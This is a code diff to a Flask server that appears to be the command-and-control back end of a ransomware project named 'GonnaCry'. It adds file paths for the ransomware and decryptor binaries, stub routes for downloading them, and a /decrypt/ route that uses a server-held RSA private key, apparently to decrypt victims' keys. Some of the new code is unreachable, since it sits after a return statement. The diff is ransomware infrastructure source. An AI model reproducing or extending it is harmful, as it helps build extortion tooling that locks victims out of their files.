@@ -3,8 +3,13 @@ from flask import render_template, url_for
 import os
 import time
 import base64
+import json
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
+
+binaries_path = 'binaries/'
+gonnacry_binary = 'binaries/gonnacry'
+decryptor_binary = 'binaries/decryptor'
 
 with open("private_key.key") as f:
     private_key = f.read()
@@ -30,12 +35,12 @@ def recive_keys():
 
 @app.route("/download-gonnacry/", methods=["GET"])
 def download_gonnacry():
-    pass
+    return ''
 
 
 @app.route("/download-decryptor/", methods=["GET"])
 def download_decryptor():
-    pass
+    return ''
 
 
 @app.route("/decrypt/", methods=['POST'])
@@ -49,6 +54,12 @@ def decrypt():
 
     return Response(data, status=200)
     
+    try:
+        enc = json.loads(data)
+    except:
+        return Response('Error in the JSON', status=400)
+
+
     key = RSA.importKey(private_key)
     cipher = PKCS1_OAEP.new(key)
     try:
@@ -63,7 +74,7 @@ def decrypt():
 
 @app.route("/")
 def main():
-    return 'nothing here ... '
+    return 'nothing to do here ... '
 
 if __name__ == '__main__':
 
